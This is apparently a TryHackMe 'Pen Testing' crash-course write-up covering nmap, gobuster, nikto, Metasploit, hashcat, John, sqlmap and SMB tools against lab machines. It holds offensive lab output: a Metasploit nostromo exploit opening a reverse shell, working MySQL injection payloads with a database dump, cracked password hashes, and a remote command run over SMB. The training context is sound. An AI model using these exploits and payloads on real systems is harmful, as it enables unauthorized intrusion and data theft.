---
title: "TryHackMe - CC: Pen Testing"
categories:
  - TryHackMe
tags:
  - crash course
  - writeup
  - tryhackme
---
A crash course on various topics in penetration testing

## [Section 1 - Network Utilities] - nmap
- What does nmap stand for?
> Network Mapper
- How do you specify which port(s) to scan?
> -p
- How do you do a "ping scan"(just tests if the host(s) is up)?
> -sn
- What is the flag for a UDP scan? 
> -sU
- How do you run default scripts?
> -sC
- How do you enable "aggressive mode"(Enables OS detection, version detection, script scanning, and traceroute)
> -A
- What flag enables OS detection
> -O
- How do you get the versions of services running on the target machine    
> -sV
- Deploy the machine
- How many ports are open on the machine?    

    ```bash
    $ rustscan -a 10.10.60.198 --ulimit 10000 -- -A -v -Pn                                                                                        130 ⨯
    .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
    | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
    | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
    `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
    The Modern Day Port Scanner.
    ________________________________________
    : https://discord.gg/GFrQsGy           :
    : https://github.com/RustScan/RustScan :
    --------------------------------------
    Real hackers hack time ⌛

    [~] The config file is expected to be at "/home/kali/.rustscan.toml"
    [~] Automatically increasing ulimit value to 10000.
    Open 10.10.60.198:80
    [~] Starting Script(s)
    [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    [~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-20 06:52 EST
    NSE: Loaded 153 scripts for scanning.
    NSE: Script Pre-scanning.
    NSE: Starting runlevel 1 (of 3) scan.
    Initiating NSE at 06:52
    Completed NSE at 06:52, 0.00s elapsed
    NSE: Starting runlevel 2 (of 3) scan.
    Initiating NSE at 06:52
    Completed NSE at 06:52, 0.00s elapsed
    NSE: Starting runlevel 3 (of 3) scan.
    Initiating NSE at 06:52
    Completed NSE at 06:52, 0.00s elapsed
    Initiating Parallel DNS resolution of 1 host. at 06:52
    Completed Parallel DNS resolution of 1 host. at 06:52, 13.00s elapsed
    DNS resolution of 1 IPs took 13.00s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
    Initiating Connect Scan at 06:52
    Scanning 10.10.60.198 [1 port]
    Discovered open port 80/tcp on 10.10.60.198
    Completed Connect Scan at 06:52, 0.19s elapsed (1 total ports)
    Initiating Service scan at 06:52
    Scanning 1 service on 10.10.60.198
    Completed Service scan at 06:53, 6.47s elapsed (1 service on 1 host)
    NSE: Script scanning 10.10.60.198.
    NSE: Starting runlevel 1 (of 3) scan.
    Initiating NSE at 06:53
    Completed NSE at 06:53, 3.48s elapsed
    NSE: Starting runlevel 2 (of 3) scan.
    Initiating NSE at 06:53
    Completed NSE at 06:53, 0.75s elapsed
    NSE: Starting runlevel 3 (of 3) scan.
    Initiating NSE at 06:53
    Completed NSE at 06:53, 0.00s elapsed
    Nmap scan report for 10.10.60.198
    Host is up, received user-set (0.19s latency).
    Scanned at 2021-01-20 06:52:58 EST for 11s

    PORT   STATE SERVICE REASON  VERSION
    80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It work
    ```

    There is only 1 port open.

- What service is running on the machine?
> It's apache
- What is the version of the service?
> 2.4.18
- What is the output of the http-title script(included in default scripts)
> Apache2 Ubuntu Default Page: It works

## [Section 1 - Network Utilities] - Netcat
- How do you listen for connections?
> -l
- How do you enable verbose mode(allows you to see who connected to you)?
> -v
- How do you specify a port to listen on
> -p
- How do you specify which program to execute after you connect to a host(One of the most infamous)?
> -e
- How do you connect to udp ports
> -u

## [Section 2 - Web Enumeration] - gobuster
- How do you specify directory/file brute forcing mode?
> dir
- How do you specify dns bruteforcing mode?    
> dns
- What flag sets extensions to be used?<br>Example: if the php extension is set, and the word is "admin" then gobuster will test admin.php against the webserver
> -x
- What flag sets a wordlist to be used?
> -w
- How do you set the Username for basic authentication(If the directory requires a username/password)?
> -U
- How do you set the password for basic authentication?
> -P
- How do you set which status codes gobuster will interpret as valid?<br>Example: 200,400,404,204
> -s
- How do you skip ssl certificate verification?
> -k
- How do you specify a User-Agent?
> -a
- How do you specify a HTTP header?
> -H
- What flag sets the URL to bruteforce?
> -u
- Deploy the machine
- What is the name of the hidden directory

    ```bash
    $ gobuster dir -u 10.10.133.67 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,jpg,html,css,jpeg,txt,conf,ini 
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.133.67
    [+] Threads:        50
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     txt,conf,ini,php,jpg,html,css,jpeg
    [+] Timeout:        10s
    ===============================================================
    2021/01/20 07:04:31 Starting gobuster
    ===============================================================
    /index.html (Status: 200)
    /secret (Status: 301)
    ```

    It's `/secret`.

- What is the name of the hidden file with the extension xxa

    ```bash
    $ gobuster dir -u 10.10.133.67 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,jpg,html,css,jpeg,txt,conf,ini,xxa 
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.133.67
    [+] Threads:        50
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     conf,xxa,php,html,txt,ini,jpg,css,jpeg
    [+] Timeout:        10s
    ===============================================================
    2021/01/20 07:12:15 Starting gobuster
    ===============================================================
    /index.html (Status: 200)
    /password.xxa (Status: 200)
    ```

    It's `/passwod.xxa`.

## [Section 2 - Web Enumeration] - nikto
- How do you specify which host to use?   
> -h
- What flag disables ssl?
> -nossl
- How do you force ssl?
> -ssl
- How do you specify authentication(username + pass)?
> -id
- How do you select which plugin to use?
> -plugins
- Which plugin checks if you can enumerate apache users?
> apacheusers. From [here](https://github.com/sullo/nikto/wiki/Plugin-list).
- How do you update the plugin list   
> -update
- How do you list all possible plugins to use
> -list-plugins

## [Section 3 Metasploit]: Setting Up
- What command allows you to search modules?
> search
- How do you select a module?    
> use
- How do you display information about a specific module?
> info
- How do you list options that you can set?
> options
- What command lets you view advanced options for a specific module?    
> advanced
- How do you show options in a specific category
> show

## [Section 3 - Metasploit]: - Selecting a module
- How do you select the eternalblue module?
> use exploit/windows/smb/ms17_010_eternalblue
- What option allows you to select the target host(s)?
> RHOSTS
- How do you set the target port?
> RPORT
- What command allows you to set options?
> set
- How would you set SMBPass to "username"?
> set SMBPass username
- How would you set the SMBUser to "password"?
> set SMBUser password
- What option sets the architecture to be exploited?
> arch
- What option sets the payload to be sent to the target machine?
> payload
- Once you've finished setting all the required options, how do you run the exploit?
> exploit
- What flag do you set if you want the exploit to run in the background?
> -J
- How do you list all current sessions?
> sessions
- What flag allows you to go into interactive mode with a session("drops you either into a meterpreter or regular shell")
> -i 

## [Section 3 - Metasploit]: meterpreter
Once you've run the exploit, ideally it will give you one of two things, a regular command shell or a meterpreter shell. Meterpreter is metasploits own "control center" where you can do various things to interact with the machine. A list of commonmeterpreter commands and their uses can be found [here](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/).

**Note:** Regular shells can usually be upgraded to meterpreter shells by using the module `post/multi/manage/shell_to_meterpreter`
{: .notice--info}

Answer:
- What command allows you to download files from the machine?
> download
- What command allows you to upload files to the machine?
> upload
- How do you list all running processes?
> ps
- How do you change processes on the victim host(Ideally it will allow you to change users and gain the perms associated with that user)
> migrate
- What command lists files in the current directory on the remote machine?
> ls
- How do you execute a command on the remote host?
> execute
- What command starts an interactive shell on the remote host?
> shell
- How do you find files on the target host(Similar function to the linux command "find")
> search
- How do you get the output of a file on the remote host?
> cat
- How do you put a meterpreter shell into "background mode"(allows you to run other msf modules while also keeping the meterpreter shell as a session)?
> background

## [Section 3 - Metasploit]: Final Walkthrough
It's time to put all the other metasploit tasks together and test them on an example machine. This machine is currently vulnerable to the metasploit module `exploit/multi/http/nostromo_code_execon` port 80, and this task will take you through the process of exploiting it and gaining a shell on the machine.

Answer:
- Select the module that needs to be exploited
> exploit/multi/http/nostromo_code_execon
- What variable do you need to set, to select the remote host

    ```bash
    msf6 exploit(multi/http/nostromo_code_exec) > options 

    Module options (exploit/multi/http/nostromo_code_exec):

    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT    80               yes       The target port (TCP)
    SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
    SRVPORT  8080             yes       The local port to listen on.
    SSL      false            no        Negotiate SSL/TLS for outgoing connections
    SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
    URIPATH                   no        The URI to use for this exploit (default is random)
    VHOST                     no        HTTP server virtual host


    Payload options (cmd/unix/reverse_perl):

    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
    LHOST                   yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port


    Exploit target:

    Id  Name
    --  ----
    0   Automatic (Unix In-Memory)
    ```

    It's RHOSTS.

- How do you set the port to 80
> set RPORT 80
- How do you set listening address(Your machine)
> LHOST
- Exploit the machine!

    ```bash
    msf6 exploit(multi/http/nostromo_code_exec) > run

    [*] Started reverse TCP handler on 10.11.25.205:9999 
    [*] Configuring Automatic (Unix In-Memory) target
    [*] Sending cmd/unix/reverse_perl command payload
    [*] Command shell session 1 opened (10.11.25.205:9999 -> 10.10.27.96:41338) at 2021-01-20 07:43:24 -0500
    ```

- What is the name of the secret directory in the /var/nostromo/htdocs directory?

    ```bash
    ls /var/nostromo/htdocs
    index.html
    nostromo.gif
    s3cretd1r
    ```

- What are the contents of the file inside of the directory?

    ```bash
    ls /var/nostromo/htdocs/s3cretd1r
    nice
    cat /var/nostromo/htdocs/s3cretd1r/nice
    Woohoo!
    ```

## [Section 4 - Hash Cracking]: Salting and Formatting
- Hash format:

    ```
    <hash 1>
    <hash 2>
    ```

- Hash with salts:

    ```
    <hash 1>:<salt>
    <hash 2>:<salt>
    ```

## [Section 4 - Hash Cracking]: hashcat
`hashcat` is another one of the most popular hash cracking tools. It is renowned for its versatility and speed. Hashcat does not have auto detection for hashtypes, instead it has modes. For example if you were trying to crack an md5 hash the "mode" would be 0, while if you were trying to crack a sha1 hash, the mode would be 100. A full list of all modes can be found [here](https://hashcat.net/wiki/doku.php?id=example_hashes).

Answer:
- What flag sets the mode.
> -m
- What flag sets the "attack mode"
> -a
- What is the attack mode number for Brute-force
> 3
- What is the mode number for SHA3-512
> 17600
- Crack This Hash:56ab24c15b72a457069c5ea42fcfc640<br>Type: MD5

    ```bash
    $ hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt             
    hashcat (v6.1.1) starting...

    OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
    =============================================================================================================================
    * Device #1: pthread-Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz, 2177/2241 MB (1024 MB allocatable), 6MCU

    Minimum password length supported by kernel: 0
    Maximum password length supported by kernel: 256

    Hashes: 1 digests; 1 unique digests, 1 unique salts
    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
    Rules: 1

    Applicable optimizers applied:
    * Zero-Byte
    * Early-Skip
    * Not-Salted
    * Not-Iterated
    * Single-Hash
    * Single-Salt
    * Raw-Hash

    ATTENTION! Pure (unoptimized) backend kernels selected.
    Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
    If you want to switch to optimized backend kernels, append -O to your commandline.
    See the above message to find out about the exact limits.

    Watchdog: Hardware monitoring interface not found on your system.
    Watchdog: Temperature abort trigger disabled.

    Host memory required for this attack: 65 MB

    Dictionary cache hit:
    * Filename..: /usr/share/wordlists/rockyou.txt
    * Passwords.: 14344385
    * Bytes.....: 139921507
    * Keyspace..: 14344385

    56ab24c15b72a457069c5ea42fcfc640:happy           
                                                    
    Session..........: hashcat
    Status...........: Cracked
    Hash.Name........: MD5
    Hash.Target......: 56ab24c15b72a457069c5ea42fcfc640
    Time.Started.....: Wed Jan 20 08:02:50 2021 (1 sec)
    Time.Estimated...: Wed Jan 20 08:02:51 2021 (0 secs)
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:  1636.9 kH/s (0.67ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
    Recovered........: 1/1 (100.00%) Digests
    Progress.........: 6144/14344385 (0.04%)
    Rejected.........: 0/6144 (0.00%)
    Restore.Point....: 0/14344385 (0.00%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
    Candidates.#1....: 123456 -> iheartyou

    Started: Wed Jan 20 08:02:49 2021
    Stopped: Wed Jan 20 08:02:52 2021
    ```

- Crack this hash:4bc9ae2b9236c2ad02d81491dcb51d5f<br>Type: MD4

    ```bash
    $ hashcat -m 900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
    hashcat (v6.1.1) starting...

    OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
    =============================================================================================================================
    * Device #1: pthread-Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz, 2177/2241 MB (1024 MB allocatable), 6MCU

    Minimum password length supported by kernel: 0
    Maximum password length supported by kernel: 256

    Hashes: 1 digests; 1 unique digests, 1 unique salts
    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
    Rules: 1

    Applicable optimizers applied:
    * Zero-Byte
    * Early-Skip
    * Not-Salted
    * Not-Iterated
    * Single-Hash
    * Single-Salt
    * Raw-Hash

    ATTENTION! Pure (unoptimized) backend kernels selected.
    Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
    If you want to switch to optimized backend kernels, append -O to your commandline.
    See the above message to find out about the exact limits.

    Watchdog: Hardware monitoring interface not found on your system.
    Watchdog: Temperature abort trigger disabled.

    Host memory required for this attack: 65 MB

    Dictionary cache hit:
    * Filename..: /usr/share/wordlists/rockyou.txt
    * Passwords.: 14344385
    * Bytes.....: 139921507
    * Keyspace..: 14344385

    4bc9ae2b9236c2ad02d81491dcb51d5f:nootnoot        
                                                    
    Session..........: hashcat
    Status...........: Cracked
    Hash.Name........: MD4
    Hash.Target......: 4bc9ae2b9236c2ad02d81491dcb51d5f
    Time.Started.....: Wed Jan 20 08:04:40 2021 (1 sec)
    Time.Estimated...: Wed Jan 20 08:04:41 2021 (0 secs)
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:  3603.4 kH/s (0.28ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
    Recovered........: 1/1 (100.00%) Digests
    Progress.........: 841728/14344385 (5.87%)
    Rejected.........: 0/841728 (0.00%)
    Restore.Point....: 835584/14344385 (5.83%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
    Candidates.#1....: odyssey26 -> newme18

    Started: Wed Jan 20 08:04:21 2021
    Stopped: Wed Jan 20 08:04:42 2021
    ```

## [Section 4 - Hash Cracking]: John The Ripper
- What flag let's you specify which wordlist to use? 
> --wordlist
- What flag lets you specify which hash format(Ex: MD5,SHA1 etc.) to use?
> --format
- How do you specify which rule to use?
> --rule
- Crack this hash:5d41402abc4b2a76b9719d911017c592<br>Type: MD5

    ```bash
    $ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                                                                    1 ⨯
    Using default input encoding: UTF-8
    Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
    Warning: no OpenMP support for this hash type, consider --fork=6
    Press 'q' or Ctrl-C to abort, almost any other key for status
    hello            (?)
    1g 0:00:00:00 DONE (2021-01-20 08:12) 100.0g/s 19200p/s 19200c/s 19200C/s 123456..november
    Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
    Session completed
    ```

- Crack this hash:5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8<br>Type: SHA1

    ```bash
    $ john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
    Warning: no OpenMP support for this hash type, consider --fork=6
    Press 'q' or Ctrl-C to abort, almost any other key for status
    password         (?)
    1g 0:00:00:00 DONE (2021-01-20 08:13) 100.0g/s 400.0p/s 400.0c/s 400.0C/s 123456..password
    Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
    Session completed
    ```

## [Section 5 - SQL Injection]: sqlmap
- How do you specify which url to check?
> -u
- What about which google dork to use?
> -g
- How do you select(lol) which parameter to use?(Example: in the url http://ex.com?test=1 the parameter would be test.)
> -p
- What flag sets which database is in the target host's backend?(Example: If the flag is set to mysql then sqlmap will only test mysql injections).
> --dbms
- How do you select the level of depth sqlmap should use(Higher = more accurate and more tests in general).
> --level
- How do you dump the table entries of the database?
> --dump
- Which flag sets which db to enumerate? (Case sensitive)
> -D
- Which flag sets which table to enumerate? (Case sensitive)
> -T
- Which flag sets which column to enumerate? (Case sensitive)
> -C
- How do you ask sqlmap to try to get an interactive os-shell?
> --os-shell
- What flag dumps all data from every table
> --dump-all

## [Section 5 - SQL Injection]: Vulnerable Web Application
- Set the url to the machine ip, and run the command

    ```bash
    $ sqlmap -u http://10.10.47.32 --forms
            ___
        __H__                                                                                                                                          
    ___ ___[.]_____ ___ ___  {1.5#stable}                                                                                                                
    |_ -| . [']     | .'| . |                                                                                                                             
    |___|_  ["]_|_|_|__,|  _|                                                                                                                             
        |_|V...       |_|   http://sqlmap.org                                                                                                           

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

    [*] starting @ 09:16:10 /2021-01-20/

    [09:16:10] [INFO] testing connection to the target URL
    [09:16:10] [INFO] searching for forms
    [#1] form:
    POST http://10.10.47.32/
    POST data: msg=
    do you want to test this form? [Y/n/q] 
    > 
    Edit POST data [default: msg=] (Warning: blank fields detected): 
    do you want to fill blank fields with random values? [Y/n] 
    [09:16:13] [INFO] using '/home/kali/.local/share/sqlmap/output/results-01202021_0916am.csv' as the CSV results file in multiple targets mode
    [09:16:13] [INFO] testing if the target URL content is stable
    [09:16:13] [INFO] target URL content is stable
    [09:16:13] [INFO] testing if POST parameter 'msg' is dynamic
    [09:16:13] [WARNING] POST parameter 'msg' does not appear to be dynamic
    [09:16:14] [INFO] heuristic (basic) test shows that POST parameter 'msg' might be injectable (possible DBMS: 'MySQL')
    [09:16:14] [INFO] heuristic (XSS) test shows that POST parameter 'msg' might be vulnerable to cross-site scripting (XSS) attacks
    [09:16:14] [INFO] testing for SQL injection on POST parameter 'msg'
    it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
    for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
    [09:16:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
    [09:16:16] [WARNING] reflective value(s) found and filtering out
    [09:16:18] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
    [09:16:19] [INFO] testing 'Generic inline queries'
    [09:16:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
    [09:16:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
    [09:16:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
    [09:16:55] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
    [09:16:56] [INFO] POST parameter 'msg' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --not-string="not")
    [09:16:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
    [09:16:56] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
    [09:16:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
    [09:16:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
    [09:16:58] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
    [09:16:58] [INFO] POST parameter 'msg' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
    [09:16:58] [INFO] testing 'MySQL inline queries'
    [09:16:58] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
    [09:16:58] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
    [09:16:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
    [09:16:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
    [09:16:59] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
    [09:17:00] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
    [09:17:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
    [09:17:11] [INFO] POST parameter 'msg' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
    [09:17:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
    [09:17:11] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
    [09:17:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
    [09:17:11] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
    [09:17:13] [INFO] target URL appears to have 1 column in query
    do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] 
    [09:17:39] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
    [09:17:45] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
    [09:17:50] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
    [09:17:57] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
    [09:18:05] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
    [09:18:11] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
    [09:18:16] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
    [09:18:22] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
    [09:18:27] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
    [09:18:33] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
    POST parameter 'msg' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
    sqlmap identified the following injection point(s) with a total of 371 HTTP(s) requests:
    ---
    Parameter: msg (POST)
        Type: boolean-based blind
        Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
        Payload: msg=iWAT' RLIKE (SELECT (CASE WHEN (5588=5588) THEN 0x69574154 ELSE 0x28 END))-- nVFb

        Type: error-based
        Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
        Payload: msg=iWAT' AND GTID_SUBSET(CONCAT(0x7170717171,(SELECT (ELT(4598=4598,1))),0x717a627671),4598)-- GDBH

        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: msg=iWAT' AND (SELECT 3128 FROM (SELECT(SLEEP(5)))SSGL)-- UPpI
    ---
    do you want to exploit this SQL injection? [Y/n] 
    [09:18:48] [INFO] the back-end DBMS is MySQL
    back-end DBMS: MySQL >= 5.6
    [09:18:50] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-01202021_0916am.csv'                                                                                                                                         

    [*] ending @ 09:18:50 /2021-01-20/
    ```

- How many types of sqli is the site vulnerable to?
> 4.
- Dump the database.

    ```bash
    $ sqlmap -u http://10.10.47.32 --forms --dump                                                                                                 130 ⨯
            ___
        __H__                                                                                                                                          
    ___ ___["]_____ ___ ___  {1.5#stable}                                                                                                                
    |_ -| . [(]     | .'| . |                                                                                                                             
    |___|_  [,]_|_|_|__,|  _|                                                                                                                             
        |_|V...       |_|   http://sqlmap.org                                                                                                           

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

    [*] starting @ 09:24:17 /2021-01-20/

    [09:24:17] [INFO] testing connection to the target URL
    [09:24:17] [INFO] searching for forms
    [#1] form:
    POST http://10.10.47.32/
    POST data: msg=
    do you want to test this form? [Y/n/q] 
    > 
    Edit POST data [default: msg=] (Warning: blank fields detected): 
    do you want to fill blank fields with random values? [Y/n] 
    [09:24:20] [INFO] resuming back-end DBMS 'mysql' 
    [09:24:20] [INFO] using '/home/kali/.local/share/sqlmap/output/results-01202021_0924am.csv' as the CSV results file in multiple targets mode
    sqlmap resumed the following injection point(s) from stored session:
    ---
    Parameter: msg (POST)
        Type: boolean-based blind
        Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
        Payload: msg=iWAT' RLIKE (SELECT (CASE WHEN (5588=5588) THEN 0x69574154 ELSE 0x28 END))-- nVFb

        Type: error-based
        Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
        Payload: msg=iWAT' AND GTID_SUBSET(CONCAT(0x7170717171,(SELECT (ELT(4598=4598,1))),0x717a627671),4598)-- GDBH

        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: msg=iWAT' AND (SELECT 3128 FROM (SELECT(SLEEP(5)))SSGL)-- UPpI
    ---
    do you want to exploit this SQL injection? [Y/n] 
    [09:24:21] [INFO] the back-end DBMS is MySQL
    back-end DBMS: MySQL >= 5.6
    [09:24:21] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
    [09:24:21] [INFO] fetching current database
    [09:24:21] [WARNING] reflective value(s) found and filtering out
    [09:24:21] [INFO] retrieved: 'tests'
    [09:24:21] [INFO] fetching tables for database: 'tests'
    [09:24:21] [INFO] retrieved: 'lol'
    [09:24:22] [INFO] retrieved: 'msg'
    [09:24:22] [INFO] fetching columns for table 'msg' in database 'tests'
    [09:24:22] [INFO] retrieved: 'msg'
    [09:24:22] [INFO] retrieved: 'varchar(100)'
    [09:24:22] [INFO] fetching entries for table 'msg' in database 'tests'
    [09:24:23] [INFO] retrieved: 'msg'
    [09:24:23] [INFO] retrieved: 'test'
    Database: tests
    Table: msg
    [2 entries]
    +------+
    | msg  |
    +------+
    | msg  |
    | test |
    +------+

    [09:24:23] [INFO] table 'tests.msg' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.47.32/dump/tests/msg.csv'
    [09:24:23] [INFO] fetching columns for table 'lol' in database 'tests'
    [09:24:24] [INFO] retrieved: 'flag'
    [09:24:24] [INFO] retrieved: 'varchar(100)'
    [09:24:24] [INFO] fetching entries for table 'lol' in database 'tests'
    [09:24:24] [INFO] retrieved: 'found_me'
    Database: tests
    Table: lol
    [1 entry]
    +----------+
    | flag     |
    +----------+
    | found_me |
    +----------+

    [09:24:24] [INFO] table 'tests.lol' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.47.32/dump/tests/lol.csv'
    [09:24:24] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-01202021_0924am.csv'                                                                                                                                         

    [*] ending @ 09:24:24 /2021-01-20/
    ```

- What is the name of the database?
> tests
- How many tables are in the database?
> 2
- What is the value of the flag?
> found_me

## [Section 6 - Samba]: smbmap
- How do you set the username to authenticate with?
> -u
- What about the password?    
> -p
- How do you set the host?
> -H
- What flag runs a command on the server(assuming you have permissions that is)?
> -x
- How do you specify the share to enumerate?
> -s
- How do you set which domain to enumerate?
> -d
- What flag downloads a file?
> --download
- What about uploading one?
> --upload
- Given the username "admin", the password "password", and the ip "10.10.10.10", how would you run ipconfig on that machine
> smbmap -u admin -p password -H 10.10.10.10 -x "ipconfig"

## [Section 6 - Samba]: smbclient
- How do you specify which domain(workgroup) to use when connecting to the host?
> -W
- How do you specify the ip address of the host?
> -I
- How do you run the command "ipconfig" on the target machine?
> -c "ipconfig"
- How do you specify the username to authenticate with?
> -U
- How do you specify the password to authenticate with?
> -P
- What flag is set to tell smbclient to not use a password?
> -N
- While in the interactive prompt, how would you download the file test, assuming it was in the current directory?
> get test
